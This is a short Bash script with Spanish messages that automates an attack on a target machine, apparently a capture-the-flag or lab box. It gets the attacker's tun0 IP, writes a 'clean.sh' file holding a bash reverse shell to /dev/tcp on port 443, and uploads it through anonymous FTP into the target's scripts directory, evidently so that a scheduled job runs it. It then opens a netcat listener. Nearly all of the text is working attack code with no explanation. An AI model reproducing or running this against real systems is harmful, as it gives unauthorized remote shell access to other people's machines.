#!/bin/bash

color_amarillo_chillon="\e[93m"
color_rojo="\e[91m"
color_verde="\e[92m"
color_amarillo="\e[33m"
color_reset="\e[0m"

echo -e "${color_amarillo}Introduce la IP de la máquina víctima: ${color_reset}"
read -p '' ip_victima

tun0=$(ifconfig tun0 | grep 'inet' | awk '{print $2}' | head -n 1)

if [ $? -eq 0 ]; then
    echo -e "${color_verde}[+]${color_reset} Hemos detectado que tu IP es $tun0 y la IP de la máquina víctima es $ip_victima"
else
    echo -e "${color_rojo}[+]${color_reset} Hubo un error en el proceso de capturar tu IP"
    exit 1
fi

# Creación del clean.sh

sleep 2

echo -e "${color_verde}[+]${color_reset} Creamos el script llamado clean.sh con el código malicioso para obtener la reverse shell"

echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/'"$tun0"'/443 0>&1' >> clean.sh

test -f clean.sh

if [ $? -eq 0 ]; then
    echo -e "${color_verde}[+]${color_reset} Se ha creado correctamente el archivo clean.sh malicioso, listo para subir a la máquina víctima"
else
    echo -e "${color_rojo}[+]${color_reset} Hubo un error en el proceso"
    exit 1
fi

# Subida del archivo al servidor FTP:

# Configuración del servidor FTP
servidor="$ip_victima"
usuario="anonymous"

# Ruta y nombre del archivo local
archivo_local="clean.sh"

# Ruta y nombre del archivo remoto en la carpeta /scripts
archivo_remoto="scripts/clean.sh"

# Comando FTP para subir el archivo

echo -e "\n" | curl -u $usuario -T "$archivo_local" ftp://$servidor/$archivo_remoto

if [ $? -eq 0 ]; then
    echo -e "${color_verde}[+]${color_reset} Se ha subido correctamente el archivo malicioso a la máquina víctima"
else
    echo -e "${color_rojo}[+]${color_reset} Hubo un error en el proceso"
    exit 1
fi


# Nos ponemos en escucha con netcat

echo -e "${color_amarillo_chillon}Nos ponemos en escucha con netcat, en menos de 5 minutos deberías recibir la reverse shell y ganar acceso remoto${color_reset}"

nc -nlvp 443
